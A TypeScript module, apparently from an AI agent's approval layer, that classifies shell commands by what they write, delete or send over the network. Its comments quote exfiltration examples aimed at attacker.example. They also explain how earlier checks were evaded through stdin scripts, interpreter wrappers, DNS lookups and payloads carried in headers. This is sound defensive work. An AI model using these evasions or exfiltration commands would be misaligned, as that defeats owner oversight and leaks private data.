/**
 * What a command is, read off the invocation: what it runs, where it writes, what it reaches, and
 * whether what came back is the owner's own bytes or somebody else's.
 *
 * Lifted out of tools.ts unchanged. Every classifier here answers a question about one `shell`
 * call - or about a script that call hands to an interpreter - and the whole point of keeping them
 * in one file is that they must agree with each other: `commandScript` is the single reader of
 * where a script was written down, and a classifier that reads `args` alone instead is exactly how
 * `stdin` walked past all of them at once.
 *
 * `tools.ts` re-exports what it always exported, so no caller moved.
 *
 * The download-quarantine trio sits here rather than with the write classifiers because
 * `untrustedShellOrigin` reads it: a `cat workspace/downloads/terms.txt` is a tainted read, and
 * putting the predicate in write-classification.ts - which already imports this module for
 * `gitSubcommand` and the package-manager sets - would close a cycle between the two.
 */
import { textValue } from './values.js';

export const FILE_WRITING_EXECUTABLES = new Set([
  'chmod',
  'chown',
  'cp',
  'install',
  'ln',
  'mkdir',
  'mv',
  'patch',
  'rename',
  'rsync',
  'tar',
  'tee',
  'touch',
  'unzip'
]);

export const WRITING_GIT_SUBCOMMANDS = new Set([
  'add',
  'am',
  'apply',
  'checkout',
  'cherry-pick',
  'clean',
  'commit',
  'init',
  'merge',
  'mv',
  'push',
  'rebase',
  'reset',
  'restore',
  'revert',
  'rm',
  'stash',
  'switch',
  'tag'
]);

export const consequentialExecutables = new Set([
  'rm',
  'rmdir',
  'unlink',
  'shred',
  'truncate',
  'shutdown',
  'reboot',
  'poweroff',
  'halt',
  'kill',
  'killall',
  'pkill',
  'dd',
  'wipefs'
]);
/**
 * Commands whose whole job is to run another command. What they run is what matters; the wrapper
 * itself changes nothing.
 */
export const COMMAND_RUNNERS = new Set([
  'env',
  'flock',
  'ionice',
  'nice',
  'nohup',
  'setsid',
  'stdbuf',
  'time',
  'timeout',
  'watch',
  'xargs'
]);

/**
 * The words a shell puts in front of a command without being one. `if grep -q x f; then cp a b; fi`
 * runs grep and then cp, and every classifier here that read the first word of the segment read
 * `if` and `then` instead - an unknown executable, twice, in a shape the model writes constantly.
 * Stripped in the same pass as the runners because they are the same fact: the token that matters
 * is the next one. The terminators are not here, because nothing follows them to be judged; they
 * are inert commands and are named as such in READ_ONLY_EXECUTABLES.
 */
const SHELL_KEYWORDS = new Set(['!', 'do', 'elif', 'else', 'exec', 'if', 'then', 'until', 'while']);

/**
 * One invocation with its wrappers taken off: leading `FOO=1` assignments, the command runners, and
 * the shell keywords, repeatedly until the head is the thing that actually runs.
 *
 * Extracted from `effectiveCommands` so `scriptCommands` can use it too, which is the whole repair:
 * the outer form `timeout 30 curl -s "$U"` was unwrapped and the identical script inside
 * `bash -lc 'timeout 30 curl -s "$U"'` was not, so the first tainted the turn and the second - the
 * spelling the shell tool's own description tells the model to reach for - read an attacker-chosen
 * page with the floor still reporting the turn clean. Measured before the fix on `timeout`, `env`
 * and `xargs`; all three were clean.
 */
const withoutRunners = (tokens: readonly string[]): string[] => {
  let rest = [...tokens];
  // Each pass drops at least one token, so this terminates on any input, and an empty list returns
  // on the first check.
  for (;;) {
    const head = (rest[0] ?? '').split('/').pop() ?? '';
    if (/^[A-Za-z_][A-Za-z0-9_]*=/.test(head) || SHELL_KEYWORDS.has(head)) {
      rest = rest.slice(1);
      continue;
    }
    if (!COMMAND_RUNNERS.has(head)) return rest;
    // The runner's own flags and the value some of them take sit between it and the command it
    // wraps: `timeout 30`, `nice -n 5`, `xargs -0`. The wrapped command is the first token that is
    // none of those - not a flag, not an assignment, not a number.
    const after = rest.slice(1);
    const wrapped = after.findIndex(
      (token) =>
        !token.startsWith('-') && !/^[A-Za-z_][A-Za-z0-9_]*=/.test(token) && !/^\d/.test(token)
    );
    rest = wrapped < 0 ? [] : after.slice(wrapped);
  }
};

export const commandInterpreters = new Set([
  'sh',
  'bash',
  'dash',
  'zsh',
  'python',
  'python3',
  'node',
  'perl',
  'ruby'
]);

const INLINE_SCRIPT_FLAGS = ['-c', '-lc', '-e', '--eval'];

/** The script text an interpreter was handed inline, or '' when it was given a file to run. */
export const inlineScriptBody = (args: readonly string[]): string =>
  args
    .flatMap((argument, index) => {
      if (INLINE_SCRIPT_FLAGS.includes(argument)) return [args[index + 1] ?? ''];
      const separator = argument.indexOf('=');
      return separator > 0 && INLINE_SCRIPT_FLAGS.includes(argument.slice(0, separator))
        ? [argument.slice(separator + 1)]
        : [];
    })
    .join('\n');

/**
 * Everything the command will actually execute, wherever it was written down.
 *
 * `shell` accepts a `stdin` string, and an interpreter reads a script from it exactly as it reads
 * one from `-c`. Every classifier here - the destinations it may reach, the paths it writes, whether
 * it is destructive, whether it came from untrusted content - read only `executable` and `args`, so
 * moving the script into `stdin` walked past all of them at once. It appeared once in this file, in
 * the schema that declares it, and nowhere else.
 */
export const commandScript = (args: Record<string, unknown>): string => {
  const commandArgs = Array.isArray(args.args) ? args.args.map(String) : [];
  return [inlineScriptBody(commandArgs), textValue(args.stdin)].filter(Boolean).join('\n');
};

/**
 * A redirection whose target leaves the workspace: absolute, home-relative, or climbing out with
 * `..`. `2>&1`, `->` and a plain `>` comparison are all excluded by construction, since none of
 * them is followed by a path shaped like one of those three.
 *
 * The discard sinks and the scratch directories are not escapes. `>/dev/null` is how every noisy
 * converter on this computer is silenced, and it removes nothing - but it is an absolute path, so
 * it stopped the task and asked the owner to approve a command that could not destroy anything.
 * That was very likely a larger share of the interruptions than any real delete.
 */
const HARMLESS_REDIRECT_TARGET = /^(?:\/dev\/(?:null|stdout|stderr|zero|tty)|\/(?:var\/)?tmp\/)/;
const escapingRedirect = (body: string): boolean => {
  for (const match of body.matchAll(/(?<![->\d])>>?\s*['"]?((?:\/|~\/|\.\.\/)[^\s'";|&)]*)/g)) {
    if (!HARMLESS_REDIRECT_TARGET.test(match[1] ?? '')) return true;
  }
  return false;
};

/**
 * Whether an inline script is destructive, rather than merely inline.
 *
 * `shell` performs no expansion, so an interpreter is the only way to pipe, glob or redirect - and
 * the built-in procedures use one constantly: reading a zip's table of contents, counting PDF
 * pages, listing installed fonts. Classifying every `-c` as destructive put a card reading "this
 * can remove or overwrite data" in front of each of those, and an owner who taps through five
 * wrong warnings taps through the sixth one that matters. So the body is scanned for the same
 * things that would escalate a bare command, plus the language-level equivalents an interpreter
 * makes reachable. Writing the identical script to a file and running it stays unescalated, which
 * is the honest reading of the rule rather than a hole in it: neither is destructive by itself.
 */
/**
 * A delete written through a language runtime, whoever the receiver happens to be called.
 *
 * This used to require the literal text `fs.`, so `require('fs').rmSync('/home/athanor')` and the
 * same call through any local name went through with no card at all - while `rm -f` on the
 * workspace's own scratch directory stopped the task. The control refused the honest phrasing and
 * missed the evasive one. Matching the method rather than the receiver closes that, and these
 * names are specific enough not to catch ordinary code: `remove` on its own is not among them,
 * because every list in every language has one.
 */
const DESTRUCTIVE_RUNTIME_CALL =
  /\.(?:rm|rmSync|rmdir|rmdirSync|unlink|unlinkSync|rmtree|removedirs)\s*\(/;

export const isDestructiveScript = (body: string): boolean =>
  new RegExp(
    `(?<![\\w.])(?:${[...consequentialExecutables].join('|')}|mkfs[\\w.-]*|shutil\\.rmtree|os\\.(?:remove|removedirs|rmdir|unlink))(?![\\w])`
  ).test(body) ||
  DESTRUCTIVE_RUNTIME_CALL.test(body) ||
  escapingRedirect(body);
export const safeNetworkExecutables = new Set([
  'apt',
  'apt-get',
  'brew',
  'cargo',
  'curl',
  'dig',
  'dnf',
  'git',
  'go',
  'host',
  'npm',
  'nslookup',
  'pip',
  'pip3',
  'ping',
  'pnpm',
  'wget',
  'yarn'
]);
/**
 * The commands a script actually runs, each one as [executable, ...arguments].
 *
 * The shell tool's own description tells the model to reach for `bash -lc` the moment it needs a
 * pipe, a glob or a redirect, so most real work arrives wrapped in an interpreter. Every other
 * classifier here already reads the real script through commandScript; the network allowlist was
 * the last policy still matching on the name of the wrapper, so `curl -O https://x` was allowlisted
 * and `bash -lc 'curl -O https://x'` - the same fetch - was an unknown executable. In autonomous
 * mode that is a card in front of nearly everything, and one download produced two of them.
 *
 * This is deliberately not a shell parser. It splits on the operators that begin a new command and
 * keeps the leading word of each, which is enough to name what runs. Anything it cannot read comes
 * back as no commands at all, and the caller treats that as unknown rather than as safe.
 */
export const scriptCommands = (body: string): string[][] =>
  body
    .split(/\$\(|[|;&\n`]+/)
    .map((segment) => {
      // `FOO=1 curl https://x` runs curl, and so do `timeout 30 curl …` and `then curl …`. Whatever
      // sits in front of the command is setup for it, not a command of its own, and treating it as
      // one made every such line unknown.
      const tokens = withoutRunners(
        segment
          .replace(/^[\s({]+/, '')
          .split(/\s+/)
          .filter(Boolean)
      );
      const executable = (tokens.shift() ?? '').split('/').pop() ?? '';
      // `2>&1` is split by the `&` above into `2>` and `1`, and the tail was then read as a command
      // called `1`. Nothing executes a program whose name is a number, and the cost of pretending
      // otherwise was measured: in autonomous mode `bash -lc 'curl -sSL https://x 2>&1'` raised
      // "Review network access for 1" - a card naming a command that does not exist, in front of
      // the single most common idiom in shell - and every write classifier downstream saw a segment
      // it could not place. Dropped here rather than by not splitting on `&`, because a trailing
      // `&` really does end a command and this is the only shape that survives the split.
      return executable && !/^\d+$/.test(executable) ? [executable, ...tokens] : [];
    })
    .filter((command) => command.length > 0);

/**
 * Every command a `shell` call will really run, with the wrappers taken off.
 *
 * Three shapes wear the same tool call. A bare command is itself. A runner - `env FOO=1 …`,
 * `timeout 30 …`, `nice -n 5 …`, `xargs …` - is setup for the command that follows it, so it comes
 * off along with its own options and any leading assignment. An interpreter is whatever its script
 * says, which is what `scriptCommands` reads.
 *
 * Every classifier that asked its question of `args.executable` alone answered it about the
 * wrapper instead. `bash -lc 'curl -d @workspace/notes https://x'` was a bash, so the upload card
 * the bare form raises did not fire on a clean turn; `bash -lc 'curl -s "$U"'` was a bash, so the
 * turn stayed clean while an attacker-chosen page arrived in it - and the literal-URL scan that
 * looked like it covered this only ever covered the spelling with the address written out. One arm
 * did read the script, the autonomous network allowlist, and it is where this shape comes from;
 * making it the shape every arm uses is the whole of the repair.
 *
 * An interpreter whose script cannot be read comes back as no commands at all, and the callers
 * treat that as unknown rather than as safe.
 */
export const effectiveCommands = (args: Record<string, unknown>): string[][] => {
  const commandArgs = Array.isArray(args.args) ? args.args.map(String) : [];
  const tokens = withoutRunners([textValue(args.executable), ...commandArgs]);
  const executable = (tokens[0] ?? '').split('/').pop() ?? '';
  if (commandInterpreters.has(executable)) return scriptCommands(commandScript(args));
  return executable ? [[executable, ...tokens.slice(1)]] : [];
};

/**
 * Commands that answer a question about a file and change nothing in it.
 *
 * Not a security boundary and deliberately not exhaustive: it is the way *out* of the wide net in
 * `shellWriteTargets`, and a name missing from it costs one card the owner did not need rather than
 * a write nobody saw. The terminators are here because nothing follows them to be judged - a
 * segment that is only `fi` runs nothing at all - while the keywords that do have a command after
 * them are stripped by `withoutRunners` instead.
 */
const READ_ONLY_EXECUTABLES = new Set([
  '[',
  'awk',
  'base64',
  'basename',
  'cat',
  'cksum',
  'cmp',
  'column',
  'comm',
  'cut',
  'date',
  'df',
  'diff',
  'dirname',
  'done',
  'du',
  'echo',
  'esac',
  'false',
  'fd',
  'fi',
  'file',
  'find',
  'fold',
  'grep',
  'head',
  'hostname',
  'id',
  'jq',
  'less',
  'ls',
  'md5sum',
  'more',
  'nl',
  'od',
  'paste',
  'printf',
  'ps',
  'pwd',
  'readlink',
  'realpath',
  'rev',
  'rg',
  'sha1sum',
  'sha256sum',
  'sort',
  'stat',
  'tail',
  'test',
  'tr',
  'true',
  'type',
  'uname',
  'uniq',
  'wc',
  'which',
  'whoami',
  'xxd',
  'yq'
]);

/**
 * Where a redirect puts what it writes.
 *
 * `2>&1` and a duplicating `>&2` are excluded by construction - the target may not begin with `&` -
 * and so is the `->` an arrow in a comment or a string draws, by the lookbehind. A numbered
 * redirect is read, because `2>err.log` writes `err.log` as surely as `>err.log` does; the narrower
 * scan in `escapingRedirect` above can afford to skip those because it is only asked whether a
 * target leaves the workspace, and this one is asked which file is written.
 */
const REDIRECT_TARGET = /(?<![->])(?:&|\d)?>>?\s*['"]?([^\s'"`;|&()<>]+)/g;

/**
 * A write performed through a language runtime rather than through a redirect or a writing command.
 *
 * The same shape as `DESTRUCTIVE_RUNTIME_CALL` and there for the same reason. `shellWriteTargets`
 * can follow a `>` and it can follow a `tee`; it cannot follow `open(p, 'w')`, and it does not have
 * to - it only has to know that it cannot and hand the question back to the wide net. Without this,
 * a script whose first word happens to be a reader (`python3 -c "cat = open('.bashrc','w'); …"`)
 * would take the read-only exit.
 */
const RUNTIME_WRITE_CALL =
  /\b(?:open|fopen)\s*\([^)]*['"][^'")]*[wax][^'")]*['"]|\.(?:write|writeFile|writeFileSync|appendFile|appendFileSync|write_text|write_bytes|writelines|createWriteStream|copyfile|copytree|copy2|move|rename|renameSync|symlink|symlinkSync|link|mkdir|makedirs|touch|chmod|dump|save)\s*\(/;

/**
 * The paths a `shell` call can be *shown* to write, or null when it cannot be shown at all.
 *
 * `writtenPaths` used to hand its two callers every whitespace-and-punctuation token in the script,
 * which made `bash -lc 'cat ~/.bashrc'` raise "Change a file this computer runs on its own" - a
 * read carded as a write, in the product's most alarming class. The bare `cat` raised nothing, so
 * the classification rewarded whichever phrasing the model happened to reach for, and
 * `tool-catalogue.ts` tells it to reach for the wrapped one the moment it needs a pipe, a glob or a
 * redirect. Measured on the owner-shaped "why is my PATH wrong" task: seven cards in nine calls,
 * six of them on commands that changed nothing. A floor the owner taps through is not a floor.
 *
 * So the write targets are resolved instead: what a redirect points at, and the arguments of a
 * command this file recognises as a writer. The fail-closed property is kept whole and moved rather
 * than dropped - the moment any command in the script is one this cannot place on either side, the
 * answer is null and the caller goes back to the wide net. That fallback costs nothing except where
 * the script also names one of the few paths the deferred-execution rule watches, and the commands
 * that name one of those while only reading it are exactly the ones enumerated above.
 */
export const shellWriteTargets = (args: Record<string, unknown>): string[] | null => {
  const script = commandScript(args);
  if (RUNTIME_WRITE_CALL.test(script)) return null;
  const commands = effectiveCommands(args);
  // An interpreter whose script could not be read at all: unknown fails closed, as it does for the
  // autonomous network allowlist and for the same reason.
  if (commands.length === 0) return null;
  const targets = [...script.matchAll(REDIRECT_TARGET)].map((match) => match[1] ?? '');
  for (const [executable = '', ...rest] of commands) {
    const name = executable.toLowerCase();
    // `sed` is a reader until `-i` makes it a writer, the same test `isMutatingToolCall` applies to
    // it, and `git` is a reader until its subcommand is one that changes the tree.
    const writes =
      name === 'git'
        ? WRITING_GIT_SUBCOMMANDS.has(gitSubcommand(rest) ?? '')
        : name === 'sed'
          ? rest.some((argument) => argument.startsWith('-i'))
          : FILE_WRITING_EXECUTABLES.has(name) || consequentialExecutables.has(name);
    if (!writes) {
      if (name === 'git' || name === 'sed' || READ_ONLY_EXECUTABLES.has(name)) continue;
      return null;
    }
    // Every operand, not the one that happens to be the destination: `cp a b` names its source too,
    // and over-naming here costs a card that was already going to be raised. The tail of a
    // `key=value` operand is taken as well, because `dd of=~/.bashrc` writes what follows the `=`.
    for (const argument of rest) {
      if (argument.startsWith('-')) continue;
      targets.push(argument);
      if (argument.includes('=')) targets.push(argument.slice(argument.indexOf('=') + 1));
    }
  }
  return targets.filter(Boolean);
};

/*
 * Short options are compared raw and long options lowercased, and the difference is the control.
 *
 * Three option pairs below differ only in case. curl's `-T` uploads a file and `-t` sets a telnet
 * option; `-X` chooses the method and `-x` names a proxy; gh's `-f` and `-F` both write a field,
 * and `-F` will read its value out of a file. Every list here used to be matched against
 * lowercased arguments, so each pair collapsed into whichever spelling happened to be written
 * down - and the gh list was `['-f','--raw-field','-f','--field','--input']`, with `-f` twice and
 * `-F` absent. It was safe by accident: the collapse always erred towards raising the card, and
 * `-F` was caught only because it arrived as `-f`. The repair that looks obvious - match the raw
 * argument against the same list - would have let `gh api -F key=@file` through as a read.
 *
 * It also cost precision in the other direction: `curl -D headers.txt https://x` is an ordinary
 * GET that writes the response headers to a local file, and it asked the owner to approve an
 * upload. A card in front of a plain fetch is a card the owner learns to tap through.
 *
 * So the short forms are enumerated by case and compared raw. The long forms stay
 * case-insensitive, deliberately: no tool here spells a long option with a capital, so lowercasing
 * can only ever catch a spelling that does not exist, which errs towards the card.
 */
const CURL_UPLOAD_SHORT_OPTIONS = new Set(['-d', '-F', '-T']);
const CURL_UPLOAD_LONG_OPTIONS = new Set([
  '--data',
  '--data-ascii',
  '--data-binary',
  '--data-raw',
  '--data-urlencode',
  '--form',
  '--form-string',
  '--upload-file'
]);
const GH_API_WRITE_SHORT_OPTIONS = new Set(['-f', '-F']);
const GH_API_WRITE_LONG_OPTIONS = new Set(['--field', '--raw-field', '--input']);

/** A method that is not one of the three that only ask for something. An absent one counts. */
const writingHttpMethod = (method: string): boolean =>
  !['get', 'head', 'options'].includes(method.toLowerCase());

/**
 * Whether a command sends data out rather than only fetching. This lived inline in the shell
 * branch, where it could only ever ask the question about the executable the tool was handed; it
 * has to be askable of a command found inside a script too, or reading the script body would turn
 * `bash -lc 'curl -d @secrets https://x'` into an allowlisted curl and quietly drop the card the
 * bare form raises.
 */
export const sendsDataOverNetwork = (executable: string, commandArgs: string[]): boolean => {
  const lowerArgs = commandArgs.map((argument) => argument.toLowerCase());
  const curlWrites =
    executable === 'curl' &&
    commandArgs.some(
      (argument, index) =>
        CURL_UPLOAD_SHORT_OPTIONS.has(argument) ||
        CURL_UPLOAD_LONG_OPTIONS.has(lowerArgs[index] ?? '') ||
        ((argument === '-X' || lowerArgs[index] === '--request') &&
          writingHttpMethod(lowerArgs[index + 1] ?? ''))
    );
  const wgetWrites =
    executable === 'wget' &&
    lowerArgs.some(
      (argument, index) =>
        argument.startsWith('--post-data=') ||
        argument.startsWith('--post-file=') ||
        argument.startsWith('--body-data=') ||
        argument.startsWith('--body-file=') ||
        ((argument === '--method' || argument.startsWith('--method=')) &&
          !['get', 'head', 'options'].includes(
            argument.includes('=') ? (argument.split('=')[1] ?? '') : (lowerArgs[index + 1] ?? '')
          ))
    );
  const ghReadOnly =
    executable === 'gh' &&
    ((lowerArgs[0] === 'api' &&
      !commandArgs.some(
        (argument, index) =>
          GH_API_WRITE_SHORT_OPTIONS.has(argument) ||
          GH_API_WRITE_LONG_OPTIONS.has(lowerArgs[index] ?? '') ||
          ((argument === '-X' || lowerArgs[index] === '--method') &&
            writingHttpMethod(lowerArgs[index + 1] ?? ''))
      )) ||
      ['status', 'search'].includes(lowerArgs[0] ?? '') ||
      (['repo', 'issue', 'pr', 'run', 'workflow', 'release'].includes(lowerArgs[0] ?? '') &&
        ['list', 'view', 'status', 'checks'].includes(lowerArgs[1] ?? '')));
  return curlWrites || wgetWrites || (executable === 'gh' && !ghReadOnly);
};

export const packageRemovalExecutables = new Set([
  // Every system package manager, not only the one this box happens to run: the approval a package
  // install raises has to be the same question on a Fedora, Rocky or Arch host as on a Debian one.
  'apk',
  'apt',
  'apt-get',
  'aptitude',
  'brew',
  'cargo',
  'dnf',
  'dnf5',
  'emerge',
  'microdnf',
  'npm',
  'pacman',
  'pip',
  'pip3',
  'pnpm',
  'yarn',
  'yay',
  'yum',
  'zypper'
]);
export const packageRemovalCommands = new Set(['remove', 'uninstall', 'purge', 'autoremove']);
export const packageInstallCommands = new Set([
  'add',
  'install',
  'update',
  'upgrade',
  'dist-upgrade',
  'full-upgrade'
]);
const gitOptionsWithSeparateValue = new Set([
  '-c',
  '-C',
  '--config-env',
  '--exec-path',
  '--git-dir',
  '--namespace',
  '--super-prefix',
  '--work-tree'
]);

/**
 * Where git's own options end and its subcommand begins, or -1 when there is no subcommand.
 * `git -C sub push` and `git --git-dir=... push` reach the same remote as a bare `git push`, so the
 * approval floor is keyed on the real subcommand rather than on the first argument.
 */
const gitSubcommandIndex = (args: readonly string[]): number => {
  for (let index = 0; index < args.length; index += 1) {
    const argument = args[index] ?? '';
    if (!argument.startsWith('-')) return index;
    if (argument.includes('=')) continue;
    if (gitOptionsWithSeparateValue.has(argument)) index += 1;
  }
  return -1;
};

export const gitSubcommand = (args: string[]): string | null => {
  const index = gitSubcommandIndex(args);
  return index < 0 ? null : (args[index] ?? '').toLowerCase();
};

/** The options that only say which file `git config` is talking about. */
const GIT_CONFIG_SCOPES = new Set(['--global', '--local', '--system', '--worktree']);

/** The options whose whole job is to print a setting back. */
const GIT_CONFIG_READS = new Set([
  '--list',
  '-l',
  '--get',
  '--get-all',
  '--get-regexp',
  '--get-urlmatch'
]);

/**
 * Settings that cannot carry execution, however they are spelled.
 *
 * Kept as an exemption rather than inverted into a list of dangerous keys, because the dangerous
 * list is open-ended - `core.hooksPath`, `alias.*`, `include.path`, `core.pager`, `credential.helper`,
 * `filter.*.clean`, `core.fsmonitor`, `init.templateDir` and whatever git adds next all end in a
 * command git runs on its own - and a rule that enumerated them would pass every key invented after
 * it was written. These fourteen are the ones a first hour on a fresh box actually sets; each one
 * takes a name, a flag or an enum, none of them takes a command, and everything else still asks.
 */
const GIT_CONFIG_INERT_KEYS = new Set([
  'advice.detachedhead',
  'color.ui',
  'core.autocrlf',
  'core.filemode',
  'core.ignorecase',
  'diff.algorithm',
  'fetch.prune',
  'init.defaultbranch',
  'merge.conflictstyle',
  'pull.rebase',
  'push.autosetupremote',
  'push.default',
  'rerere.enabled',
  'user.email',
  'user.name'
]);

/**
 * What a `git config` invocation writes: the setting's own key, or '' when the invocation is one
 * this cannot read confidently. Null when it only reads.
 *
 * `git config` writes `.gitconfig` without ever naming a path, so the deferred-execution rule that
 * reads the paths a call writes cannot see it at all - it needs its own answer, and two callers
 * need the same one. The floor asks whether to stop for the owner; `isMutatingToolCall` asks
 * whether the computer changed, which is why it was wrong for a call the floor already calls
 * consequential to be no change at all. One predicate, so the two cannot drift apart.
 *
 * The '' case is the fail-closed one and it is load-bearing: `--file` and `-f` redirect the write to
 * a file of the caller's choosing, `--unset` and `--add` change what the operands mean, and any of
 * them makes the key unnameable here. An invocation carrying anything but a scope reports a key
 * nothing can exempt, which is the same answer as an unrecognised key.
 */
export const gitConfigWrite = (args: readonly string[]): string | null => {
  const index = gitSubcommandIndex(args);
  if (index < 0 || (args[index] ?? '').toLowerCase() !== 'config') return null;
  const rest = args.slice(index + 1);
  if (rest.some((argument) => GIT_CONFIG_READS.has(argument.toLowerCase()))) return null;
  const options = rest.filter((argument) => argument.startsWith('-'));
  const operands = rest.filter((argument) => !argument.startsWith('-'));
  if (!options.every((option) => GIT_CONFIG_SCOPES.has(option.toLowerCase()))) return '';
  // `git config user.email` with nothing after it prints the setting; it is the spelling for a read
  // that does not use `--get`, and carding it was the same defect as carding `cat`.
  return operands.length < 2 ? null : (operands[0] ?? '').toLowerCase();
};

/** Whether a `git config` write can leave behind something a later git invocation executes. */
export const gitConfigRunsCode = (args: readonly string[]): boolean => {
  const key = gitConfigWrite(args);
  return key !== null && !GIT_CONFIG_INERT_KEYS.has(key);
};

/**
 * Every http(s) address named anywhere in a shell call, including inside an inline script.
 *
 * `shell` has no network flag it must set to reach the internet - the installer ships the
 * per-command namespace off, because a command with its own loopback breaks published previews - so
 * `network: true` is a declaration rather than a gate. An exfiltration does not have to declare
 * itself: `curl https://attacker.example/?q=<the mailbox>` is a read-shaped GET, it trips none of
 * the write-flag checks below, and it is the same clean channel `parallel_web_read` is already
 * judged on. So while the turn is tainted the addresses are pulled out of the command itself and
 * run through the same destination policy.
 */
const URL_IN_COMMAND = /https?:\/\/[^\s'"`<>\\)]+/g;

const literalUrlsInCommand = (args: Record<string, unknown>): string[] => {
  const commandArgs = Array.isArray(args.args) ? args.args.map(String) : [];
  const command = [textValue(args.executable), ...commandArgs, commandScript(args)].join(' ');
  return [...new Set(command.match(URL_IN_COMMAND) ?? [])];
};

/**
 * The programs whose argument is a name for the network to resolve, not a file to open.
 *
 * A name lookup is the cheapest exfiltration channel on any computer: the payload IS the name, it
 * leaves through the resolver before anything answers, and it needs no reply and no listening
 * service to succeed. `dig <the mailbox, base32>.attacker.example` was measured on this tree as
 * zero destinations, zero bytes charged and no card, on a turn the floor had already marked
 * tainted.
 *
 * The reachability tools are here for the same reason and not as an afterthought: `ping` resolves
 * the name exactly as `dig` does, so closing one and leaving the other is not a bound, it is a
 * change of spelling. The cost is stated in docs/design/ranked/CARD-AND-SHELL.md - on a tainted
 * turn `ping -c1 8.8.8.8` now raises a card - and it is a card, not a refusal.
 */
const RESOLVING_EXECUTABLES = new Set([
  'delv',
  'dig',
  'dog',
  'drill',
  'getent',
  'host',
  'kdig',
  'mtr',
  'nslookup',
  'ping',
  'ping6',
  'resolvectl',
  'systemd-resolve',
  'tracepath',
  'traceroute',
  'traceroute6'
]);

/**
 * Clients where every argument that names a host is an address the call would fetch - and which
 * therefore ALWAYS write their address down, so one that does not is one this cannot read.
 *
 * The second half is the honest half of the shell bound, and it is the same set rather than a second
 * one beside it because two lists of the same seven names drift. `curl -s "$U"`,
 * `wget "$(cat url.txt)"` and every other address composed at run time are unreadable here and
 * always will be - no static reader resolves a variable - and until now they were the quietest hole
 * in the file: the fetch tainted the turn, then no destination was found, so no card was raised and
 * no bytes were charged, and the turn went on being judged as though nothing had left. An unreadable
 * destination is the strongest case for asking the owner, not the weakest, so these raise the card
 * the address would have raised.
 *
 * `git`, `gh` and the package managers are deliberately absent. Their remote lives in the
 * repository's or the installation's own configuration rather than in the command, so requiring an
 * address of them would card `git pull`, `gh api /repos/x/y` and `pip install requests` on every
 * tainted turn - the ordinary work of this product - to catch a shape none of them is used in.
 * `git clone "$U"` is the gap that leaves, and it is stated rather than papered over.
 */
const FETCH_CLIENT_EXECUTABLES = new Set([
  'aria2c',
  'curl',
  'http',
  'httpie',
  'wget',
  'youtube-dl',
  'yt-dlp'
]);

/**
 * Clients that open one connection, to the first host their arguments name.
 *
 * Only the first, because everything after it is the remote command or the payload: the tokens in
 * `ssh host.example cat notes.txt` after `host.example` run on the far end, and reading them as
 * addresses would put `notes.txt` on the card as somewhere data was going.
 */
const CONNECTING_EXECUTABLES = new Set(['ftp', 'nc', 'ncat', 'netcat', 'socat', 'ssh', 'telnet']);

/**
 * Copiers where a remote end is written as a remote end.
 *
 * `scp`, `sftp` and `rsync` tell local from remote by the `:` or the `@`, which is a fact about
 * their argument grammar rather than a guess about it - so `scp notes.txt user@x.example:/tmp/`
 * names one destination and not two.
 */
const REMOTE_SPEC_EXECUTABLES = new Set(['rsync', 'scp', 'sftp']);

/**
 * Options whose value is something on this computer, so the token after them names no address.
 *
 * Case matters and the existing spelling test says why: curl's `-D` writes the response headers to
 * a local file and `-d` sends a body, `-T` uploads and `-t` sets a telnet option. Long forms are
 * matched lowercased, short forms exactly, which is how `sendsDataOverNetwork` above already reads
 * the same argument lists.
 *
 * This list is the PRECISION and not the safety, in the direction that matters: a spelling missing
 * from it means a local filename is offered to the address reader, which at worst costs one card on
 * a turn that has already read untrusted content. A spelling wrongly ON it would hide an address,
 * so nothing is here whose value can be one - `-x/--proxy`, `--url`, `--resolve` and `--connect-to`
 * all name somewhere on the network and are all deliberately absent.
 */
const LOCAL_VALUE_OPTIONS: Record<string, ReadonlySet<string>> = {
  curl: new Set([
    '-o',
    '-D',
    '-c',
    '-K',
    '-E',
    '-T',
    '-w',
    '-X',
    '-m',
    '-C',
    '-Y',
    '-y',
    '-z',
    '--output',
    '--dump-header',
    '--cookie-jar',
    '--config',
    '--cert',
    '--key',
    '--cacert',
    '--capath',
    '--upload-file',
    '--write-out',
    '--request',
    '--netrc-file',
    '--trace',
    '--trace-ascii',
    '--stderr',
    '--max-time'
  ]),
  wget: new Set([
    '-O',
    '-o',
    '-a',
    '-P',
    '-i',
    '-t',
    '-T',
    '-w',
    '-Q',
    '--output-document',
    '--output-file',
    '--append-output',
    '--directory-prefix',
    '--input-file',
    '--load-cookies',
    '--save-cookies',
    '--ca-certificate',
    '--ca-directory',
    '--certificate',
    '--private-key',
    '--post-file',
    '--body-file',
    '--config'
  ]),
  ssh: new Set(['-i', '-F', '-E', '-S', '-o']),
  scp: new Set(['-i', '-F', '-E', '-S', '-o']),
  sftp: new Set(['-i', '-F', '-E', '-S', '-o', '-b']),
  rsync: new Set(['-e', '--rsh', '--exclude-from', '--files-from', '--log-file', '--password-file'])
};

/**
 * Options whose value is material the request carries without any of it appearing in the address.
 *
 * This is the second half of the shell hole and the one that needed a decision rather than a list.
 * `curl -H "X-Data: <the mailbox>" https://docs.example.com/` goes to a host the turn legitimately
 * read, so the address costs two bytes and raises nothing, while the payload rides out in a header
 * that nothing here was measuring. HTTP does not care which part of a request the bytes are in and
 * neither does the recipient, so neither does the budget: these values are attached to the address
 * before it is judged, and `classifyDestination` charges them exactly as it charges a path segment.
 *
 * Ordinary work stays ordinary because the charge is against the owner's own corpus rather than
 * against a threshold on the flag. Measured: `curl -H 'Accept: application/json'` on an address a
 * search handed the model costs 30 of the 1,024 bytes a tainted turn may spend and raises nothing -
 * thirty-four such requests before anybody is asked - while a 96-byte payload in the same header
 * costs 107 and raises the card on the first one. Carding on the presence of `-H` would have
 * stopped both, and a bound that interrupts real work is one the owner turns off.
 */
const CARRIED_VALUE_OPTIONS: Record<string, ReadonlySet<string>> = {
  curl: new Set([
    '-H',
    '-d',
    '-F',
    '-b',
    '-A',
    '-e',
    '-u',
    '--header',
    '--data',
    '--data-ascii',
    '--data-binary',
    '--data-raw',
    '--data-urlencode',
    '--form',
    '--form-string',
    '--cookie',
    '--user-agent',
    '--referer',
    '--user',
    '--url-query'
  ]),
  wget: new Set([
    '--header',
    '--post-data',
    '--body-data',
    '--user',
    '--password',
    '--user-agent',
    '--referer'
  ])
};

const IPV4_LITERAL = /^\d{1,3}(?:\.\d{1,3}){3}$/;
/**
 * A dotted name with a top-level label that could be one: two or more characters, letter first.
 *
 * Anchored, and that is what does the work. Every non-address a fetch client is handed - a header
 * value, a form field, an httpie `name=John Smith`, a `%{http_code}` format string - fails on the
